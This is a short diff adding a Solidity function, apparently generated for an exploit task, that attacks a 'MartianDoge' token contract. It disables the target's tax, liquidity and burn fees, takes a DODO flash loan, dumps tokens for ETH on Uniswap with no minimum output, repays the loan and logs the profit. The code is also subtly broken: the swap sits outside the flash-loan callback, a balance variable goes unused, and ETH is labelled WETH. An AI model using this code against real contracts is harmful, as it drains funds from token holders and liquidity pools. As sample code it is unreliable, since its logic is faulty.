@@ -1,0 +1,30 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Remove fees from the MartianDoge contract
+    IMartianDoge(target).setTaxFee(0);
+    IMartianDoge(target).setLiquidityFee(0);
+    IMartianDoge(target).setBurnFee(0);
+
+    // Step 2: Flash loan valuableToken while receiving the output
+    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), abi.encode(uint256(0)));
+
+    // Step 3: Swap for more valuable tokens using Uniswap
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // Valuable token
+    path[1] = uniswapRouter.WETH(); // Swap to WETH
+
+    // Step 4: Execute swap
+    uint256 amountOutMin = 0; // Accept any amount
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, amountOutMin, path, address(this), block.timestamp);
+
+    // Step 5: Return the borrowed amount to DODO
+    uint256 balanceAfterFlashLoan = valuableToken.balanceOf(address(this));
+    valuableToken.transfer(flashloanProvider, amount);
+    
+    // Capture surplus in WETH (check if profit is achieved)
+    uint256 surplus = address(this).balance; // The balance in WETH after flash loan
+    console.log("Surplus in WETH: ", surplus);
+}
+</executeExploitCode>
+```
